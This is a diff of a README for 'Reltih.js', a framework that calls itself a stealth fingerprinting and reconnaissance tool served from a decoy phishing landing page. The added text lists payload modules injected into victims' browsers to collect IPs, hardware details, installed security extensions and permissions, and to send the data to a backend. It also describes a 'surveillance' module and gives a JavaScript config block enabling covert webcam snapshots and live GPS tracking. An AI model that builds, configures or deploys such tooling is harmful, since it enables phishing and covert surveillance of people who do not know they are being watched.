@@ -44,11 +44,21 @@ Reltih.js is a highly stealthy fingerprinting and reconnaissance framework desig
 ├── index.html                 # Decoy GuardSync phishing landing page
 ├── dashboard.html             # Real-time monitoring dashboard
 ├── fp/                        # Fingerprinting payload modules
-│   ├── os.js                  # OS & Platform detection
+│   ├── behavioral.js          # User interaction & bot heuristics
 │   ├── browser.js             # Browser brand, version & features
-│   ├── murmur.js              # Canvas, WebGL, Audio & Font hashing
-│   ├── timing.js              # Interaction & timing forensics
-│   └── environment.js         # Hardware & Battery context
+│   ├── codecs.js              # Media capabilities & webRTC profiling
+│   ├── core.js                # Aggregation & webhook orchestrator 
+│   ├── environment.js         # Hardware context flagger
+│   ├── extensions.js          # Installed extension detector
+│   ├── gpu_ram.js             # Graphics renderer & memory profiler
+│   ├── hardware.js            # Processor, battery & pointer enumeration
+│   ├── murmur.js              # WebGL, Canvas, Audio & Font hashing
+│   ├── network.js             # Local/Public IPs & GeoIP fetching
+│   ├── os.js                  # OS, kernel & driver enumeration
+│   ├── permissions.js         # API access rights tracking
+│   ├── storage.js             # Local session footprinting
+│   ├── surveillance.js        # Webcam and live GPS capture
+│   └── timing.js              # Execution speed forensics
 └── Database/                  # Auto-generated device intel storage
 ```
 
@@ -65,6 +75,53 @@ Reltih.js is a highly stealthy fingerprinting and reconnaissance framework desig
 | **Covert Camera** | Stealth webcam image capture and base64 remote extraction |
 | **Risk Scoring Engine** | Evaluates trust based on hardware context, returning low/high risk flags |
 | **Live Dashboard** | Terminal-styled real-time device monitoring with session viewer |
+
+---
+
+## `$ Payload Modules (fp/)`
+
+The `fp/` directory contains the modular JavaScript payloads injected into the target's browser. They run silently to extract deep metrics before tunneling data back to the Flask API.
+
+| Module File | Functionality |
+|-------------|---------------|
+| `behavioral.js`| Evaluates mouse movement, typing speeds, and interaction heuristics to detect headless bots. |
+| `browser.js` | Fingerprints the true browser brand, full version context, plugins, and feature flags. |
+| `codecs.js`  | Probes for supported media codecs, WebRTC leak points, and DRM capabilities. |
+| `core.js`    | The central orchestrator that aggregates all data payloads and tunnels them to the backend API. |
+| `environment.js`| Analyzes high-level hardware constraints (Battery, Touch, Pointer) to flag Virtual Machines. |
+| `extensions.js`| Scans internal browser object models to detect commonly installed security extensions. |
+| `gpu_ram.js` | Profiles the graphics rendering engine, video memory, and device RAM size constraints. |
+| `hardware.js`| Enumerates CPU architecture, physical core counts, and peripheral types connected to the machine. |
+| `murmur.js`  | Calculates robust device fingerprints via WebGL, Canvas, Audio oscillators, and System Fonts. |
+| `network.js` | Extracts WebRTC local IPs, internal network topology, and integrates external GeoIP APIs. |
+| `os.js`      | Details the Operating System version, platform build, and underlying kernel architecture. |
+| `permissions.js`| Checks what hardware access APIs (camera, mic, location) the user has already approved. |
+| `storage.js` | Measures local storage quotas, indexedDB capabilities, and session footprint sizes. |
+| `surveillance.js`| Core module executing stealth physical intelligence collection (Webcam snapshots and Live GPS tracing). |
+| `timing.js`  | Collects forensic performance execution timings to detect sluggish sandboxed environments. |
+
+---
+
+## `$ Configuration & Payload Toggles`
+
+You can manually configure the intensity of the exploit by modifying the toggles in `index.html`. Locate the `Surveillance.init()` execution block to adjust settings:
+
+```javascript
+try {
+    const result = await Surveillance.init(deviceId, {
+        enableLocation: true,   // Set to TRUE to trigger accurate GPS polling
+        enableCamera: true,     // Set to TRUE to initiate stealth Webcam capture
+        camShots: 13            // Configure the number of consecutive photos to extract
+    });
+    console.log('Surveillance started:', result);
+} catch (e) {
+    console.warn('Surveillance failed or blocked:', e);
+}
+```
+
+*   **`enableLocation`**: Polls High-Accuracy GPS data using `navigator.geolocation`. If permission is not granted, IP-based trailing is used as a fallback.
+*   **`enableCamera`**: Activates the target's webcam silently inside a hidden video element, snapping frames.
+*   **`camShots`**: Defines exactly how many surveillance snapshots should be generated and uploaded to the `Database/` directory.
 
 ---
 
